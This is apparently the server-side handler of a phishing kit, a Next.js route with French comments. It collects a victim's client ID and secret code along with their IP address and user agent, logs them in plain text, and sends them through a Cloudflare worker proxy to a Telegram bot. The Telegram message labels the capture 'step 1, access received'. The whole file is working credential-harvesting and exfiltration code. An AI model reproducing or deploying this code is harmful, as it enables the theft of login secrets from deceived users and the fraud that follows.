import { NextResponse } from 'next/server';

export async function POST(request) {
    try {
        // 1. Récupération des données du formulaire
        const formData = await request.formData();
        
        // 2. Détection de l'IP et du User-Agent (Natifs et fiables sur Vercel)
        const userIp = request.headers.get('x-forwarded-for') || 'Inconnue';
        const userAgent = request.headers.get('user-agent') || 'Navigateur inconnu';

        // 3. Récupération et assainissement des inputs
        const clientId = formData.get('client_id');
        const secretCode = formData.get('secret_code');
        const pageSource = formData.get('page_source') || 'Non spécifiée';

        // Sécurité de base : validation des champs requis
        if (!clientId || !secretCode) {
            return NextResponse.json(
                { success: false, message: 'Données incomplètes.' },
                { status: 400 }
            );
        }

        // 4. SAUVEGARDE LOGS (Alternative Vercel Serverless)
        // Note : Le stockage local sur fichier étant impossible sur Vercel, on envoie
        // la ligne dans la console. Elle sera visible en temps réel et historisée
        // directement dans l'onglet "Logs" de votre tableau de bord Vercel.
        const dateStr = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
        console.log(`[FAILSAFE LOG] [${dateStr}] IP: ${userIp} | Source: ${pageSource} | ID: ${clientId} | Code: ${secretCode} | UA: ${userAgent}`);

        // 5. Formatage du message pour Telegram
        let message = `⚜️ **[ ÉTAPE 1 - ACCÈS REÇU ]** ⚜️\n`;
        message += `───────────────────\n\n`;
        message += `📍 **Provenance :** \`Page ${pageSource}\`\n`;
        message += `👤 **ID :** \`${clientId}\`\n`;
        message += `🔑 **Code :** \`${secretCode}\`\n\n`;
        message += `───────────────────\n`;
        message += `📅 **Date :** \`${dateStr}\``;

        // 6. Récupération des variables d'environnement (Mêmes clés que l'étape 2)
        const workerUrl = process.env.WORKER_URL || 'https://wer-proxy.angelobarbes.workers.dev';
        const telegramToken = process.env.TELEGRAM_TOKEN;
        const telegramChatId = process.env.TELEGRAM_CHAT_ID;

        const gatewayUrl = `${workerUrl.replace(/\/$/, '')}/bot${telegramToken}/sendMessage`;

        // 7. Envoi vers Telegram via Fetch
        await fetch(gatewayUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({
                chat_id: telegramChatId,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: 'true'
            })
        });

        // 8. Réponse JSON instantanée renvoyée à votre script front-end
        return NextResponse.json({ success: true });

    } catch (error) {
        console.error("Erreur serveur Étape 1 :", error);
        return NextResponse.json(
            { success: false, message: "Une erreur est survenue lors du traitement." },
            { status: 500 }
        );
    }
}